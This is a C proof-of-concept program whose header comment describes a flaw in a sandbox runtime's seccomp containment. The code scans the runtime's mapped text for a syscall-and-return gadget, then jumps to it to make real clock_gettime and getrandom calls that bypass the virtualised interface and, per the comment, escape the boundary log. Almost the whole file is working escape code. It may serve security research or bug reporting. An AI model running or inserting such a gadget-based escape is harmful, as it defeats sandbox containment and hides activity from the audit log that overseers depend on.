/* Containment: the seccomp filter lets through every syscall whose instruction pointer is in
 * the runtime's text. A guest that jumps to a `syscall` instruction there (any one followed by
 * a few instructions and `ret`) makes real, untrapped calls: here the host's real
 * CLOCK_REALTIME and the real getrandom, neither of which the boundary log records. */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
/* syscall; mov $-104,%rax; add $8,%rsp; ret */
static const uint8_t pat[] = {0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x98, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x08, 0xc3};
static uint8_t *find(void) {
    uint8_t *t = (uint8_t *)0x600000000000ull;
    int p[2]; if (pipe(p)) return 0;
    for (size_t pg = 0; pg < (8u << 20); pg += 4096) {
        if (write(p[1], t + pg, 1) != 1) break; /* EFAULT: end of the mapped text */
        char c; read(p[0], &c, 1);
        for (size_t i = pg; i < pg + 4096 - sizeof pat; i++) if (!memcmp(t + i, pat, sizeof pat)) return t + i;
    }
    return 0;
}
static void raw(uint8_t *g, long nr, long a, long b, long c) {
    register long r10 __asm__("r10") = 0;
    __asm__ volatile(
        "lea 1f(%%rip), %%r11\n\t"
        "push %%r11\n\t"
        "sub $8, %%rsp\n\t"
        "jmp *%[g]\n\t"
        "1:\n\t"
        : "+a"(nr), "+D"(a), "+S"(b), "+d"(c), "+r"(r10)
        : [g] "r"(g)
        : "rcx", "r11", "memory");
}
int main(void) {
    uint8_t *g = find();
    printf("gadget %s\n", g ? "found" : "not found");
    if (!g) return 0;
    struct timespec v, h = {0}; clock_gettime(CLOCK_REALTIME, &v);
    raw(g, 228 /* clock_gettime */, CLOCK_REALTIME, (long)&h, 0);
    printf("virtual realtime %lld; real call gives year %lld\n", (long long)v.tv_sec, (long long)(h.tv_sec / 31556952 + 1970));
    unsigned char rnd[8] = {0};
    raw(g, 318 /* getrandom */, (long)rnd, 8, 0);
    printf("real getrandom %02x%02x%02x%02x\n", rnd[0], rnd[1], rnd[2], rnd[3]);
    return 0;
}
